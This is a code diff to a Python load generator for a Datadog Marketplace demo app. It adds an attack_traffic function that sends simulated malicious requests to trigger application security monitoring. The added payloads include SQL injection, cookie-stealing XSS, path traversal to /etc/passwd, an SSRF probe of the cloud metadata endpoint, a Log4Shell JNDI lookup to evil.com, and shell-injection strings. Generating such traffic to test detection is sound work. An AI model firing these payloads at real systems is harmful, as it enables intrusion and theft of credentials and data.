@@ -82,6 +82,41 @@ def admin_traffic():
     except Exception as e:
         print(f"  [admin error] {e}")
 
+def attack_traffic():
+    """Simulates malicious requests to trigger ASM (Application Security Management).
+    These payloads are safe — they're just strings that ASM pattern-matches on."""
+    h = session_headers()
+    attacks = [
+        # SQL injection attempts
+        ("search", {"q": "' OR 1=1 --"}),
+        ("search", {"q": "admin'; DROP TABLE products;--"}),
+        ("search", {"q": "' UNION SELECT username, password FROM users--"}),
+        # XSS attempts
+        ("search", {"q": "<script>alert('xss')</script>"}),
+        ("search", {"q": "<img src=x onerror=alert(document.cookie)>"}),
+        # Path traversal
+        ("product_traversal", None),
+        # Server-side request forgery (SSRF)
+        ("search", {"q": "http://169.254.169.254/latest/meta-data/"}),
+        # Log4Shell style
+        ("search", {"q": "${jndi:ldap://evil.com/exploit}"}),
+        # Shell injection
+        ("search", {"q": "; cat /etc/passwd"}),
+        ("search", {"q": "| ls -la /"}),
+    ]
+    attack_type, payload = random.choice(attacks)
+    try:
+        if attack_type == "product_traversal":
+            r = requests.get(f"{BASE}/products/../../etc/passwd", headers=h, timeout=5)
+            print(f"  [attack] path traversal | {r.status_code}")
+        else:
+            r = requests.get(f"{BASE}/search", params=payload, headers=h, timeout=10)
+            q = payload.get("q", "")[:40]
+            print(f"  [attack] {q!r} | {r.status_code}")
+    except Exception as e:
+        print(f"  [attack error] {e}")
+
+
 def run():
     print("Datadog Marketplace Load Generator starting... (Ctrl+C to stop)")
     print(f"Target: {BASE}\n")
@@ -94,8 +129,8 @@ def run():
         print(f"\n── Iteration {iteration} ──")
 
         action = random.choices(
-            ["browse", "search", "admin"],
-            weights=[70, 20, 10],
+            ["browse", "search", "admin", "attack"],
+            weights=[60, 15, 10, 15],
         )[0]
 
         if action == "browse":
@@ -104,6 +139,8 @@ def run():
             search_traffic()
         elif action == "admin":
             admin_traffic()
+        elif action == "attack":
+            attack_traffic()
 
         time.sleep(interval + random.uniform(-0.5, 1.0))
 
